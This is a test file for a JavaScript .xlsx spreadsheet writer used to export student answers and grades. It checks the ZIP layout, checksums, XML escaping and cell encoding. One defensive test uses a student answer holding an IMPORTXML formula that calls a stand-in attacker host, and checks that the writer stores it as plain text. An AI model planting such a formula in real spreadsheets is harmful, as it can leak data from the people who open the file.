import { describe, it, expect } from 'vitest';
import { crc32, zip, xml, colName, cell, sheet, widthFor, workbook, STYLES } from './xlsx.js';

/**
 * An .xlsx is a ZIP of XML, so the test unpacks it and reads the XML.
 *
 * Everything here is stored rather than deflated, which means a reader
 * is thirty lines and no dependency — and it is the only way to know
 * that what came out is really a spreadsheet without opening Excel.
 */
function unzip(bytes) {
  const dv = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const dec = new TextDecoder();
  const out = {};
  let at = 0;

  while (at + 4 <= bytes.length && dv.getUint32(at, true) === 0x04034b50) {
    const method = dv.getUint16(at + 8, true);
    const size = dv.getUint32(at + 18, true);
    const nameLen = dv.getUint16(at + 26, true);
    const extraLen = dv.getUint16(at + 28, true);
    const name = dec.decode(bytes.subarray(at + 30, at + 30 + nameLen));
    const from = at + 30 + nameLen + extraLen;

    if (method !== 0) throw new Error(`${name} is compressed; this writer only stores`);
    out[name] = {
      text: dec.decode(bytes.subarray(from, from + size)),
      crc: dv.getUint32(at + 14, true),
      bytes: bytes.subarray(from, from + size),
    };
    at = from + size;
  }
  return out;
}

const ctrl = String.fromCharCode(7);

describe('the ZIP underneath', () => {
  it('is a real archive a reader can walk', () => {
    const bytes = zip([{ name: 'a.txt', data: 'hello' }]);
    const files = unzip(bytes);
    expect(Object.keys(files)).toEqual(['a.txt']);
    expect(files['a.txt'].text).toBe('hello');
  });

  it('ends with a central directory, or nothing will open it', () => {
    const bytes = zip([{ name: 'a.txt', data: 'x' }]);
    const dv = new DataView(bytes.buffer);
    /* the end-of-central-directory signature, in the last 22 bytes */
    expect(dv.getUint32(bytes.length - 22, true)).toBe(0x06054b50);
  });

  it('checksums what it wrote', () => {
    const files = unzip(zip([{ name: 'a.txt', data: 'hello' }]));
    expect(files['a.txt'].crc).toBe(crc32(new TextEncoder().encode('hello')));
  });

  it('agrees with the CRC-32 everyone else computes', () => {
    /* the known value for "123456789" — if this drifts, every file
       this writes is quietly corrupt */
    expect(crc32(new TextEncoder().encode('123456789'))).toBe(0xcbf43926);
  });

  it('writes entry names with forward slashes, always', () => {
    /* a backslash silently broke an upload earlier in this project;
       the spec allows only '/' */
    const files = unzip(zip([{ name: 'xl\\worksheets\\sheet1.xml', data: 'x' }]));
    expect(Object.keys(files)).toEqual(['xl/worksheets/sheet1.xml']);
  });

  it('handles a name and a body that are not English', () => {
    const files = unzip(zip([{ name: '성적/답.xml', data: '델라는 머리카락을 팔았다' }]));
    expect(files['성적/답.xml'].text).toBe('델라는 머리카락을 팔았다');
  });
});

describe('the XML', () => {
  it('escapes what would otherwise break the file', () => {
    expect(xml('a<b>&"c"')).toBe('a&lt;b&gt;&amp;&quot;c&quot;');
  });

  it('strips a control character rather than writing an unopenable file', () => {
    expect(xml(`before${ctrl}after`)).toBe('beforeafter');
  });

  it('keeps the whitespace and the newlines a student wrote', () => {
    expect(xml('one\ntwo\ttab')).toBe('one\ntwo\ttab');
  });

  it('says nothing for nothing', () => {
    expect(xml(null)).toBe('');
    expect(xml(undefined)).toBe('');
  });

  it('names columns the way a spreadsheet does', () => {
    expect(colName(1)).toBe('A');
    expect(colName(26)).toBe('Z');
    expect(colName(27)).toBe('AA');
    expect(colName(52)).toBe('AZ');
    expect(colName(53)).toBe('BA');
  });
});

describe('a cell', () => {
  it('writes a number as a number', () => {
    expect(cell('A1', { v: 7, n: true })).toContain('<v>7</v>');
  });

  it('writes text as an inline string', () => {
    expect(cell('A1', { v: 'Ana' })).toContain('t="inlineStr"');
  });

  it('never turns a student’s answer into a formula', () => {
    /* =IMPORTXML in an answer box must not run in a teacher's
       spreadsheet */
    const c = cell('A1', { v: '=IMPORTXML("http://evil.example","//x")' });
    expect(c).toContain('t="inlineStr"');
    expect(c).not.toContain('<f>');
  });

  it('writes a formula only when it is asked for one', () => {
    expect(cell('A1', { f: 'SUM(B1:B9)' })).toContain('<f>SUM(B1:B9)</f>');
  });

  it('leaves an empty cell empty, and keeps its style', () => {
    expect(cell('A1', { v: '', s: 4 })).toBe('<c r="A1" s="4"/>');
  });

  it('keeps a number that arrived as text as text', () => {
    /* 07 is a student number, not seven */
    expect(cell('A1', { v: '07' })).toContain('>07<');
  });
});

describe('a sheet', () => {
  const rows = [
    {
      cells: [
        { v: 'Name', s: 1 },
        { v: 'Score', s: 1 },
      ],
    },
    { cells: [{ v: 'Ana Lopez' }, { v: 9, n: true }] },
  ];

  it('lays cells out by row and column', () => {
    const x = sheet(rows);
    expect(x).toContain('<c r="A1"');
    expect(x).toContain('<c r="B2"');
    expect(x).toContain('Ana Lopez');
  });

  it('numbers a formula for the row it lands on', () => {
    /* '#' means "this row", so a column of formulas is written once */
    const x = sheet([{ cells: [] }, { cells: [null, { f: 'SUM(C#:D#)' }] }]);
    expect(x).toContain('SUM(C2:D2)');
  });

  it('freezes the header when asked, so a long class stays readable', () => {
    expect(sheet(rows, [], { x: 0, y: 1 })).toContain('state="frozen"');
    expect(sheet(rows)).not.toContain('frozen');
  });

  it('sets the widths it is given', () => {
    expect(sheet(rows, [{ w: 12 }])).toContain('width="12"');
  });

  it('measures a width from what is actually in the column', () => {
    expect(widthFor(rows, 0, 8, 40)).toBe('Ana Lopez'.length + 2);
    expect(widthFor(rows, 0, 30, 40), 'never below the minimum').toBe(30);
    expect(widthFor(rows, 0, 4, 6), 'never above the maximum').toBe(6);
  });
});

describe('the workbook as a whole', () => {
  const file = () =>
    workbook([
      { name: 'Grades', xml: sheet([{ cells: [{ v: 'Ana' }] }]) },
      { name: 'Answers', xml: sheet([{ cells: [{ v: 'Why does Della cry?' }] }]) },
    ]);

  it('contains every part Excel insists on', () => {
    const files = unzip(file());
    for (const part of [
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/workbook.xml',
      'xl/_rels/workbook.xml.rels',
      'xl/styles.xml',
      'xl/worksheets/sheet1.xml',
      'xl/worksheets/sheet2.xml',
    ]) {
      expect(Object.keys(files), `missing ${part}`).toContain(part);
    }
  });

  it('names its tabs', () => {
    const wb = unzip(file())['xl/workbook.xml'].text;
    expect(wb).toContain('name="Grades"');
    expect(wb).toContain('name="Answers"');
  });

  it('declares a content type for every sheet', () => {
    const ct = unzip(file())['[Content_Types].xml'].text;
    expect((ct.match(/worksheets\/sheet\d\.xml/g) || []).length).toBe(2);
  });

  it('relates each sheet, and the stylesheet, to the workbook', () => {
    const rels = unzip(file())['xl/_rels/workbook.xml.rels'].text;
    expect(rels).toContain('worksheets/sheet1.xml');
    expect(rels).toContain('worksheets/sheet2.xml');
    expect(rels).toContain('styles.xml');
  });

  it('asks the app to calculate on open', () => {
    /* the formulas carry no cached value, so without this the score
       column looks empty until somebody edits a cell */
    expect(unzip(file())['xl/workbook.xml'].text).toContain('fullCalcOnLoad="1"');
  });

  it('is well-formed XML in every part', () => {
    const parser = new DOMParser();
    for (const [name, f] of Object.entries(unzip(file()))) {
      const doc = parser.parseFromString(f.text, 'application/xml');
      expect(doc.querySelector('parsererror'), `${name} is not well-formed`).toBeNull();
    }
  });

  it('ships a stylesheet with the score column in it', () => {
    /* style 4 is the yellow box a teacher types a mark into */
    expect(STYLES).toContain('FFFFF2C4');
    expect(unzip(file())['xl/styles.xml'].text).toBe(STYLES);
  });
});
